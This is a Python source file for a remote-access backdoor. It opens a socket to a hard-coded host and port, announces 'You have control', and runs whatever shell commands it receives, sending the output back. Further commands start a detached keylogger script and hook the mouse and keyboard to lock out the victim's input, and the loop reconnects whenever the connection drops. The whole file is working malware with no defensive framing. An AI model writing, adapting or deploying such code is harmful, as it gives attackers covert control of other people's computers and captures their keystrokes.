#! /usr/bin/env python

import pythoncom
import pyHook
import socket
import subprocess
import sys
import thread
import time

HOST = '127.0.0.1'   
PORT = 22

def setBlock(event):    
    return False    
    
def blockInput():    
    hookManager = pyHook.HookManager()    
    hookManager.MouseAll = setBlock    
    hookManager.KeyAll = setBlock    
    hookManager.HookMouse()    
    hookManager.HookKeyboard()    
    pythoncom.PumpMessages()    
    
def connect((host, port)):
	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketHolder.connect((host, port))
	return socketHolder

def run_shell_cmd(socketHolder):
    data = socketHolder.recv(1024)
    if data:
        if data == "exit":
            socketHolder.close()
            sys.exit(0)
        elif data == "logKeysOn":
            # Execute an external program without waiting for it to finish
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            DETACHED_PROCESS = 0x00000008
            pid = subprocess.Popen([sys.executable, "logKeys.py"],
                creationflags=DETACHED_PROCESS).pid
            socketHolder.send('Logger started')
        elif data == 'blockInput':
            blockInput()
        elif len(data) == 0:
            return True
        else:
			proc = subprocess.Popen(data, shell=True,
				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			socketHolder.send(stdout_value)
			return False
    else:
		print 'Lost connection to host. Will attempt to reconnect.'
		socketHolder = connect((HOST,PORT))

def main():
    while True:
            try:
                socketHolder = connect((HOST,PORT))
                socketHolder.send('You have control')
                while True:
                    commandsFromMaster = run_shell_cmd(socketHolder)
                socketHolder.close()
            except socket.error:
                pass

if __name__ == "__main__":
        sys.exit(main())